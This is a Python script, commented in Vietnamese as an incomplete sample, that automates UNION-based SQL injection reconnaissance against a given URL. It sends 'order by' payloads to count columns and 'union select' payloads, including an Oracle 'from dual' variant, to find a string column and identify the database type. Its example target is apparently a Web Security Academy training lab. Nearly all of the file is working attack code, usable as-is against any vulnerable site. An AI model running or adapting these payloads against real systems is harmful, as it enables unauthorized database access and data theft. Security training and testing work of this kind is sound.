# Lưu ý: mẫu dưới đây chưa hoàn chỉnh
# Chức năng: công cụ thu thập số cột và kiểu dữ liệu của cột trong hệ quản trị cơ sở SQL.

import sys
import urllib3
import urllib.parse
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def detect_columns(session:requests.Session, url:str) -> int:
    print("[+] Start finding the number of columns...")
    
    for idx in range(1, 100, 1):
        payload:str = f" order by {idx} --"
        encoded_payload:str = urllib.parse.quote(payload)
        target:str = f"{url}{encoded_payload}"

        try:
            # Cấu hình khi dùng Burp Suite
            # r = session.get(target, verify=False, proxies=PROXIES)
            r = session.get(target, verify=False)

            if (r.status_code == 500):
                print(f"[!] Column number found: {idx-1}")
                return idx-1
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    print("[!] The number of columns could not be found.")
    return None


def detect_string_column(session:requests.Session, url:str, cols:int) -> dict:
    print("[+] Start scanning String columns and identifying the database...")
    init_payload = ["NULL"] * cols

    for idx in range(0, cols, 1):
        test_payload = list(init_payload)
        test_payload[idx] = "\'abc\'"
        payload_str = ",".join(test_payload)

        # Non-Oracle: PostgreSQL, MySQL, MS SQL
        sql_payload = f" union select {payload_str} --"
        payload = f"{url}{urllib.parse.quote(sql_payload)}"
        try:
            # Cấu hình khi dùng Burp Suite
            # r = s.get(payload, verify=False, proxies=PROXIES)
            r = session.get(payload, verify=False)

            if (r.status_code == 200):
                return {
                    "db_type": "non-oracle",
                    "string_column_index": idx
                }
        except requests.exceptions.RequestException as e:
            print(f"[-] Network error in standard payload: {e}")

        # Oracle
        sql_payload = f" union select {payload_str} from dual --"
        payload = f"{url}{urllib.parse.quote(sql_payload)}"
        try:
            # Cấu hình khi dùng Burp Suite
            # r = s.get(payload, verify=False, proxies=PROXIES)
            r = session.get(payload, verify=False)

            if (r.status_code == 200):
                return {
                    "db_type": "oracle",
                    "string_column_index": idx
                }
        except requests.exceptions.RequestException as e:
            print(f"[-] Network error in standard payload: {e}")

    print("[!] No columns supporting String or WAF blocking were found.")
    return None


if __name__ == "__main__":
    if len(sys.argv)!=2:
        print(f"[-] Usage: python {sys.argv[0]} <url_injection_point>")
        print(f"[-] Example: python {sys.argv[0]} \"https://xyz.web-security-academy.net/filter?category=Gifts'\"")
        sys.exit(-1)

    target_url = sys.argv[1]

    s = requests.Session()
    
    col_cnt = detect_columns(s, target_url)    
    if (col_cnt == None) or (col_cnt==0): exit(1)

    type_database = detect_string_column(s, target_url, col_cnt)
    if (type_database == None): exit(1)
    print(f"[!] {type_database}")